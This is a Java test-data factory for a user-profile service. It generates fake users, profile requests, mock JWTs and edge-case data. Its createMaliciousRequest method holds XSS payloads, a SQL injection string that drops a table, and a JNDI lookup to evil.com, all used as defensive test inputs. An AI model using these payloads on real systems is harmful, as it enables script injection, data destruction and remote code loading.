package com.doordash.user_service.utils;

import com.doordash.user_service.domain.dtos.user.CreateUserProfileRequest;
import com.doordash.user_service.domain.dtos.user.UpdateUserProfileRequest;
import com.doordash.user_service.domain.dtos.user.UserProfileResponse;
import com.doordash.user_service.domain.entities.User;
import com.doordash.user_service.domain.entities.UserProfile;
import com.doordash.user_service.domain.enums.UserStatus;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import net.datafaker.Faker;
import org.springframework.http.HttpHeaders;
import org.springframework.http.MediaType;
import org.springframework.security.oauth2.jwt.Jwt;
import org.springframework.test.web.servlet.MvcResult;

import java.time.Instant;
import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.ZoneOffset;
import java.util.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.stream.IntStream;

/**
 * Enhanced utility class for comprehensive test data creation and common test operations.
 * 
 * Provides factory methods for creating test entities, DTOs, and mock objects with
 * realistic data using Faker library for better test scenarios.
 * Centralizes test data creation to ensure consistency across test classes.
 * 
 * Features:
 * - Realistic test data generation using Faker
 * - Builder patterns for complex objects
 * - Performance testing data sets
 * - Edge case data scenarios
 * - Security testing data
 * - JSON serialization/deserialization helpers
 * - Bulk data generation for load testing
 * 
 * @author DoorDash Backend Team
 * @version 2.0
 */
public final class EnhancedTestDataFactory {

    private static final ObjectMapper objectMapper = new ObjectMapper()
            .registerModule(new JavaTimeModule());
    
    private static final Faker faker = new Faker();
    private static final Random random = new Random();

    // Predefined test data sets for realistic scenarios
    private static final List<String> TEST_CITIES = Arrays.asList(
        "New York", "Los Angeles", "Chicago", "Houston", "Phoenix", 
        "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose",
        "Austin", "Jacksonville", "Fort Worth", "Columbus", "Indianapolis"
    );
    
    private static final List<String> TEST_STATES = Arrays.asList(
        "NY", "CA", "IL", "TX", "AZ", "PA", "TX", "CA", "TX", "CA",
        "TX", "FL", "TX", "OH", "IN"
    );
    
    private static final List<String> TEST_PHONE_FORMATS = Arrays.asList(
        "+1-###-###-####", "+1(###)###-####", "+1 ### ### ####", "+1#########"
    );

    private EnhancedTestDataFactory() {
        // Utility class - prevent instantiation
    }

    // =================================
    // USER ENTITY CREATION METHODS
    // =================================

    /**
     * Creates a test User entity with realistic fake data.
     */
    public static User createRealisticUser() {
        return createRealisticUser(UUID.randomUUID());
    }

    /**
     * Creates a test User entity with specified ID and realistic fake data.
     */
    public static User createRealisticUser(UUID id) {
        String firstName = faker.name().firstName();
        String lastName = faker.name().lastName();
        String email = generateRealisticEmail(firstName, lastName);
        String username = generateRealisticUsername(firstName, lastName);
        
        return User.builder()
            .id(id)
            .email(email)
            .username(username)
            .firstName(firstName)
            .lastName(lastName)
            .phoneNumber(faker.phoneNumber().phoneNumber())
            .status(randomUserStatus())
            .emailVerified(faker.bool().bool())
            .passwordHash("$2a$12$" + faker.internet().password(60, 60))
            .createdAt(generatePastDateTime())
            .updatedAt(generateRecentDateTime())
            .lastLoginAt(faker.bool().bool() ? generateRecentDateTime() : null)
            .build();
    }

    /**
     * Creates a test User entity with specific values for controlled testing.
     */
    public static User createTestUser(UUID id, String email, String username) {
        return User.builder()
            .id(id)
            .email(email)
            .username(username)
            .firstName(faker.name().firstName())
            .lastName(faker.name().lastName())
            .phoneNumber(faker.phoneNumber().phoneNumber())
            .passwordHash("$2a$10$hashed.password.example")
            .status(UserStatus.ACTIVE)
            .emailVerified(true)
            .createdAt(LocalDateTime.now().minusDays(1))
            .updatedAt(LocalDateTime.now())
            .build();
    }

    /**
     * Creates a User with specific status for testing different user states.
     */
    public static User createUserWithStatus(UserStatus status) {
        User user = createRealisticUser();
        user.setStatus(status);
        return user;
    }

    /**
     * Creates a User for security testing with edge case data.
     */
    public static User createSecurityTestUser() {
        return User.builder()
            .id(UUID.randomUUID())
            .email("security.test@example.com")
            .username("securityuser")
            .firstName("Security")
            .lastName("Test")
            .phoneNumber("+1234567890")
            .passwordHash("$2a$12$securitytesthash")
            .status(UserStatus.ACTIVE)
            .emailVerified(true)
            .createdAt(LocalDateTime.now())
            .updatedAt(LocalDateTime.now())
            .build();
    }

    // =================================
    // USER PROFILE CREATION METHODS
    // =================================

    /**
     * Creates a realistic UserProfile entity.
     */
    public static UserProfile createRealisticUserProfile(User user) {
        return UserProfile.builder()
            .id(UUID.randomUUID())
            .user(user)
            .firstName(user.getFirstName())
            .lastName(user.getLastName())
            .dateOfBirth(generateRealisticBirthDate())
            .phoneNumber(user.getPhoneNumber())
            .profilePictureUrl(faker.internet().url() + "/profile.jpg")
            .bio(faker.lorem().paragraph(3))
            .city(TEST_CITIES.get(random.nextInt(TEST_CITIES.size())))
            .state(TEST_STATES.get(random.nextInt(TEST_STATES.size())))
            .zipCode(faker.address().zipCode())
            .createdAt(user.getCreatedAt())
            .updatedAt(user.getUpdatedAt())
            .build();
    }

    /**
     * Creates a UserProfile with minimal required data.
     */
    public static UserProfile createMinimalUserProfile(User user) {
        return UserProfile.builder()
            .id(UUID.randomUUID())
            .user(user)
            .firstName(user.getFirstName())
            .lastName(user.getLastName())
            .phoneNumber(user.getPhoneNumber())
            .createdAt(LocalDateTime.now())
            .updatedAt(LocalDateTime.now())
            .build();
    }

    // =================================
    // DTO CREATION METHODS
    // =================================

    /**
     * Creates a realistic CreateUserProfileRequest DTO.
     */
    public static CreateUserProfileRequest createRealisticCreateRequest() {
        return CreateUserProfileRequest.builder()
            .firstName(faker.name().firstName())
            .lastName(faker.name().lastName())
            .dateOfBirth(generateRealisticBirthDate())
            .phoneNumber(faker.phoneNumber().phoneNumber())
            .bio(faker.lorem().paragraph(2))
            .city(TEST_CITIES.get(random.nextInt(TEST_CITIES.size())))
            .state(TEST_STATES.get(random.nextInt(TEST_STATES.size())))
            .zipCode(faker.address().zipCode())
            .build();
    }

    /**
     * Creates a CreateUserProfileRequest with invalid data for validation testing.
     */
    public static CreateUserProfileRequest createInvalidCreateRequest() {
        return CreateUserProfileRequest.builder()
            .firstName("") // Invalid - empty
            .lastName(null) // Invalid - null
            .dateOfBirth(LocalDate.now().plusDays(1)) // Invalid - future date
            .phoneNumber("123") // Invalid - too short
            .bio("A".repeat(2001)) // Invalid - exceeds max length
            .city("X".repeat(101)) // Invalid - too long
            .state("XXX") // Invalid - not 2 characters
            .zipCode("1234") // Invalid - too short
            .build();
    }

    /**
     * Creates an UpdateUserProfileRequest with realistic data.
     */
    public static UpdateUserProfileRequest createRealisticUpdateRequest() {
        return UpdateUserProfileRequest.builder()
            .firstName(faker.name().firstName())
            .lastName(faker.name().lastName())
            .phoneNumber(faker.phoneNumber().phoneNumber())
            .bio(faker.lorem().paragraph(2))
            .city(TEST_CITIES.get(random.nextInt(TEST_CITIES.size())))
            .state(TEST_STATES.get(random.nextInt(TEST_STATES.size())))
            .zipCode(faker.address().zipCode())
            .build();
    }

    // =================================
    // BULK DATA CREATION METHODS
    // =================================

    /**
     * Creates multiple realistic users for performance testing.
     */
    public static List<User> createRealisticUsers(int count) {
        return IntStream.range(0, count)
                .mapToObj(i -> createRealisticUser())
                .toList();
    }

    /**
     * Creates multiple CreateUserProfileRequest DTOs for bulk testing.
     */
    public static List<CreateUserProfileRequest> createBulkCreateRequests(int count) {
        return IntStream.range(0, count)
                .mapToObj(i -> createRealisticCreateRequest())
                .toList();
    }

    /**
     * Creates users with different statuses for comprehensive testing.
     */
    public static List<User> createUsersWithAllStatuses() {
        return Arrays.stream(UserStatus.values())
                .map(EnhancedTestDataFactory::createUserWithStatus)
                .toList();
    }

    // =================================
    // SECURITY TESTING DATA
    // =================================

    /**
     * Creates a request with potentially malicious data for security testing.
     */
    public static CreateUserProfileRequest createMaliciousRequest() {
        return CreateUserProfileRequest.builder()
            .firstName("<script>alert('XSS')</script>")
            .lastName("'; DROP TABLE users; --")
            .phoneNumber("+1234567890")
            .bio("Malicious content with <img src='x' onerror='alert(1)'> and ${jndi:ldap://evil.com/x}")
            .city("<svg onload=alert(1)>")
            .state("CA")
            .zipCode("90210")
            .build();
    }

    /**
     * Creates requests with boundary value data for edge case testing.
     */
    public static CreateUserProfileRequest createBoundaryRequest() {
        return CreateUserProfileRequest.builder()
            .firstName("A") // Minimum length
            .lastName("B".repeat(100)) // Maximum length
            .dateOfBirth(LocalDate.of(1900, 1, 1)) // Very old date
            .phoneNumber("+1" + "0".repeat(18)) // Maximum phone length
            .bio("C".repeat(2000)) // Maximum bio length
            .city("D".repeat(100)) // Maximum city length
            .state("CA")
            .zipCode("00000")
            .build();
    }

    // =================================
    // JWT AND AUTHENTICATION HELPERS
    // =================================

    /**
     * Creates a mock JWT token for testing.
     */
    public static Jwt createMockJwt() {
        return createMockJwt(UUID.randomUUID().toString(), "testuser", "test@example.com");
    }

    /**
     * Creates a mock JWT token with specific claims.
     */
    public static Jwt createMockJwt(String userId, String username, String email) {
        Map<String, Object> headers = Map.of(
            "alg", "RS256",
            "typ", "JWT",
            "kid", "test-key-id"
        );

        Map<String, Object> claims = Map.of(
            "sub", userId,
            "preferred_username", username,
            "email", email,
            "given_name", faker.name().firstName(),
            "family_name", faker.name().lastName(),
            "roles", List.of("USER"),
            "scope", "profile email",
            "exp", Instant.now().plusSeconds(3600),
            "iat", Instant.now(),
            "iss", "https://auth.doordash.com",
            "aud", "user-service"
        );

        return new Jwt(
            "test-token-" + UUID.randomUUID(),
            Instant.now(),
            Instant.now().plusSeconds(3600),
            headers,
            claims
        );
    }

    /**
     * Creates authenticated HTTP headers.
     */
    public static HttpHeaders createAuthenticatedHeaders() {
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.set("Authorization", "Bearer " + generateMockJwtToken());
        return headers;
    }

    /**
     * Creates authenticated HTTP headers with specific user ID.
     */
    public static HttpHeaders createAuthenticatedHeaders(String userId) {
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.APPLICATION_JSON);
        headers.set("Authorization", "Bearer " + generateMockJwtToken(userId));
        return headers;
    }

    // =================================
    // JSON UTILITIES
    // =================================

    /**
     * Converts object to JSON string.
     */
    public static String toJson(Object object) {
        try {
            return objectMapper.writeValueAsString(object);
        } catch (Exception e) {
            throw new RuntimeException("Failed to convert object to JSON", e);
        }
    }

    /**
     * Converts JSON string to object.
     */
    public static <T> T fromJson(String json, Class<T> clazz) {
        try {
            return objectMapper.readValue(json, clazz);
        } catch (Exception e) {
            throw new RuntimeException("Failed to convert JSON to object", e);
        }
    }

    /**
     * Extracts JSON response from MvcResult.
     */
    public static String extractJsonResponse(MvcResult result) {
        try {
            return result.getResponse().getContentAsString();
        } catch (Exception e) {
            throw new RuntimeException("Failed to extract JSON response", e);
        }
    }

    // =================================
    // PRIVATE HELPER METHODS
    // =================================

    private static String generateRealisticEmail(String firstName, String lastName) {
        String baseEmail = firstName.toLowerCase() + "." + lastName.toLowerCase();
        String domain = faker.options().option("gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "example.com");
        return baseEmail + faker.number().numberBetween(1, 999) + "@" + domain;
    }

    private static String generateRealisticUsername(String firstName, String lastName) {
        return firstName.toLowerCase() + lastName.toLowerCase() + faker.number().numberBetween(10, 9999);
    }

    private static UserStatus randomUserStatus() {
        return faker.options().option(UserStatus.values());
    }

    private static LocalDate generateRealisticBirthDate() {
        return faker.date().birthday(18, 80).toInstant()
                .atZone(ZoneOffset.UTC).toLocalDate();
    }

    private static LocalDateTime generatePastDateTime() {
        return LocalDateTime.now().minusDays(faker.number().numberBetween(1, 365));
    }

    private static LocalDateTime generateRecentDateTime() {
        return LocalDateTime.now().minusHours(faker.number().numberBetween(1, 72));
    }

    private static String generateMockJwtToken() {
        return "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.test-claims." + 
               UUID.randomUUID().toString().replace("-", "");
    }

    private static String generateMockJwtToken(String userId) {
        return "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9." + 
               Base64.getEncoder().encodeToString(userId.getBytes()) + "." +
               UUID.randomUUID().toString().replace("-", "");
    }

    // =================================
    // PERFORMANCE TEST DATA GENERATORS
    // =================================

    /**
     * Performance test data generator for load testing scenarios.
     */
    public static class PerformanceTestDataGenerator {
        
        /**
         * Creates a large dataset for stress testing.
         */
        public static List<CreateUserProfileRequest> createStressTestData(int count) {
            return IntStream.range(0, count)
                    .parallel()
                    .mapToObj(i -> CreateUserProfileRequest.builder()
                        .firstName("StressUser" + i)
                        .lastName("Test" + i)
                        .dateOfBirth(LocalDate.of(1990, (i % 12) + 1, (i % 28) + 1))
                        .phoneNumber("+123456789" + String.format("%02d", i % 100))
                        .bio("Stress test user " + i)
                        .city(TEST_CITIES.get(i % TEST_CITIES.size()))
                        .state(TEST_STATES.get(i % TEST_STATES.size()))
                        .zipCode(String.format("%05d", i % 100000))
                        .build())
                    .toList();
        }

        /**
         * Creates concurrent test scenarios.
         */
        public static List<User> createConcurrentTestUsers(int count) {
            return IntStream.range(0, count)
                    .parallel()
                    .mapToObj(i -> User.builder()
                        .id(UUID.randomUUID())
                        .email("concurrent" + i + "@test.com")
                        .username("concurrent" + i)
                        .firstName("Concurrent" + i)
                        .lastName("User" + i)
                        .phoneNumber("+1555000" + String.format("%04d", i))
                        .passwordHash("$2a$10$hashed.password.example")
                        .status(UserStatus.ACTIVE)
                        .emailVerified(true)
                        .createdAt(LocalDateTime.now())
                        .updatedAt(LocalDateTime.now())
                        .build())
                    .toList();
        }
    }

    // =================================
    // EDGE CASE DATA GENERATORS
    // =================================

    /**
     * Edge case data generator for comprehensive testing.
     */
    public static class EdgeCaseDataGenerator {
        
        /**
         * Creates users with edge case names (special characters, unicode, etc.).
         */
        public static User createUnicodeUser() {
            return User.builder()
                .id(UUID.randomUUID())
                .email("unicode@test.com")
                .username("unicode_user")
                .firstName("José")
                .lastName("García-Müller")
                .phoneNumber("+1234567890")
                .passwordHash("$2a$10$hashed.password.example")
                .status(UserStatus.ACTIVE)
                .emailVerified(true)
                .createdAt(LocalDateTime.now())
                .updatedAt(LocalDateTime.now())
                .build();
        }

        /**
         * Creates a request with minimum valid data.
         */
        public static CreateUserProfileRequest createMinimalValidRequest() {
            return CreateUserProfileRequest.builder()
                .firstName("A")
                .lastName("B")
                .phoneNumber("+1234567890")
                .build();
        }

        /**
         * Creates a request with maximum valid data.
         */
        public static CreateUserProfileRequest createMaximalValidRequest() {
            return CreateUserProfileRequest.builder()
                .firstName("A".repeat(50))
                .lastName("B".repeat(50))
                .dateOfBirth(LocalDate.of(1900, 1, 1))
                .phoneNumber("+1" + "2".repeat(18))
                .bio("C".repeat(2000))
                .city("D".repeat(100))
                .state("CA")
                .zipCode("12345")
                .build();
        }
    }
}
